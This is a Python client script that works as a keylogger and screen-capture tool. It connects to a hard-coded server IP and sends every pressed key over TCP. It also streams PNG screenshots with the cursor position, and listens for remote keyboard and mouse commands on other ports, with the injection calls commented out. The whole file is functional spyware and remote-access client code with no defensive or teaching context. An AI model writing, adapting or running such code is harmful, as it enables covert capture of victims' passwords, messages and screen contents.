import struct

import keyboard
import socket
import sys

import pyautogui
from PIL import ImageGrab
import time
import io
import win32api
import json
server_ip = '172.49.11.100'
def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    return buf

def send_message_to_server(client_socket,message):
    print("Sending")
    client_socket.sendall(message.encode())
def print_pressed_keys(key, client_socket):
    print("Pressed: ", key.name)
    message = f"Key pressed: {key.name}"
    send_message_to_server(client_socket,message)

def send_screenshot():
    port = 5003
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, port))
    # Create a TCP/IP socket
    while True:
        # Capture screenshot
        screenshot = pyautogui.screenshot()

        # Get mouse position
        mouse_pos = pyautogui.position()

        # Convert the screenshot to a byte array
        bio = io.BytesIO()
        screenshot.save(bio, format="PNG")
        b = bio.getvalue()

        # Send mouse position, length of byte array and byte array
        data = struct.pack('!II', mouse_pos[0], mouse_pos[1]) + struct.pack('!I', len(b)) + b
        client_socket.sendall(data)


def keyboard_controlled():
    port = 5001
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip,port))
    print("Connected with server")
    while True:
        key = s.recv(1024).decode()
        if key != "":
         print("Press key - > ",key)
         #keyboard.press_and_release(key)
        else:
            print("connection lost with server")
            s.close()
            break
def mouse_controlled():
    port = 5002
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = "test"
    data = data.encode()
    s.sendto(data,(server_ip,port))
    print("Sent message to server")
    s.settimeout(5)
    try: 
        while True:
            mouse_location_binary = s.recvfrom(1024)
            mouse_location = json.loads(mouse_location_binary[0].decode())
            print("Recived tuple: ", mouse_location)
            x = mouse_location[0]
            y = mouse_location[1]
            print(f"X = {x}, Y = {y}")
            #win32api.SetCursorPos(x,y)
            #else:
            #  s.close()
            #   break
    except socket.timeout:
        print("Server stopped sending packets. Exiting...")
        s.close()
        sys.exit()


    

def keylogger():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 5000
    connection_successful = False
    s.connect((server_ip, port))
    print("Connected")
    connection_successful = True
    def on_key_pressed(key):
        print_pressed_keys(key, s)
    keyboard.on_press(on_key_pressed)
    if not connection_successful:
        print("Failed to connect to the server")
        s.close()
        sys.exit()
    keyboard.wait('esc')
    s.close()
def main():
    #keylogger()
    #keyboard_controlled()
    #mouse_controlled()
    send_screenshot()
if __name__ == "__main__":
    main()   

